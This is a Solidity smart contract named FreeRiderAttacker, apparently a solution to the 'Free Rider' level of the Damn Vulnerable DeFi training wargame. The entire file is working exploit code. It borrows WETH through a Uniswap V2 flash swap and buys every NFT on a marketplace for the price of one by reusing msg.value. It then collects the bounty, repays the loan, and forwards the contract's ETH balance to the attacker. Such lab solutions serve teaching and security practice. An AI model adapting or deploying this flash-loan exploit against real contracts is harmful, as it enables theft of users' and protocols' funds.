// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "@uniswap/v2-core/contracts/interfaces/IUniswapV2Pair.sol";
import '@uniswap/v2-core/contracts/interfaces/IUniswapV2Callee.sol';
import '@openzeppelin/contracts/token/ERC20/IERC20.sol';
import "@openzeppelin/contracts/token/ERC721/IERC721Receiver.sol";
import "../FreeRiderNFTMarketplace.sol";


interface IWETH is IERC20 {
  receive() external payable;

  function deposit() external payable;

  function withdraw(uint256 wad) external;
}

/**
 * @title FreeRiderAttacker
 * @author y0ng0p3 (https://github.com/y0ng0p3/)
 */
contract FreeRiderAttacker is IUniswapV2Callee, IERC721Receiver {
    IUniswapV2Pair public uniswapPair;
    FreeRiderNFTMarketplace public marketplace;
    address private owner;
    address payable public devsContract;
    uint256 public nftPrice;
    uint8 public numberOfNFT;

    error NotExploitContract();

    constructor(
        address _pair,
        address _marketplace,
        address _devsContract,
        uint256 _nftPrice,
        uint8 _numberOfNFT
    ) payable {
        owner = msg.sender;
        devsContract = payable(_devsContract);
        uniswapPair = IUniswapV2Pair(_pair);
        marketplace = FreeRiderNFTMarketplace(payable(_marketplace));
        nftPrice = _nftPrice;
        numberOfNFT = _numberOfNFT;
    }

    function attack() external {
        // Borrow sufficient amount from uniswap (flash swap) to buy one token
        bytes memory data = abi.encode(uniswapPair.token0(), nftPrice);
        uniswapPair.swap(nftPrice, 0, address(this), data);

        // send all the ETH received to the attacker
        (bool success,) = owner.call{value: address(this).balance}("");   
        require(success, "Failed to send ETH");
    }

    function uniswapV2Call(
        address sender,
        uint,
        uint,
        bytes calldata data
    ) external override {
        assert(msg.sender == address(uniswapPair)); // ensure that msg.sender is a V2 pair
        if (sender != address(this)) {
            revert NotExploitContract();
        }

        // decode get token and the amount borrowed
        (address tokenBorrowed, uint amountBorrowed) = abi.decode(data, (address, uint));
        // unwrap WETH
        IWETH weth = IWETH(payable(tokenBorrowed));
        weth.withdraw(amountBorrowed);

        // buy tokens from marketplace, all of them at the price of one
        uint256[] memory tokenIds = new uint256[](numberOfNFT);
        for(uint256 id; id < numberOfNFT; ++id) {
            tokenIds[id] = id;
        }
        marketplace.buyMany{ value: nftPrice }(tokenIds);
        

        // compute amount to repay
        // about 0.3% [https://docs.uniswap.org/contracts/v2/guides/smart-contract-integration/using-flash-swaps]
        uint256 fee = (amountBorrowed * 3) / 997;
        uint256 amountToRepay = amountBorrowed + fee;

        // send all tokens to the devs' contract and receive reward
        DamnValuableNFT nft = DamnValuableNFT(marketplace.token());
        for(uint256 id; id < numberOfNFT; ++id) {
            tokenIds[id] = id;
            nft.safeTransferFrom(address(this), devsContract, id);
        }

        // repay debt
        weth.deposit{ value: amountToRepay }();
        assert(weth.transfer(address(uniswapPair), amountToRepay));
    }

    function onERC721Received(address, address, uint256, bytes memory) external pure returns (bytes4) {
        return IERC721Receiver.onERC721Received.selector;
    }

    receive() external payable {}
}
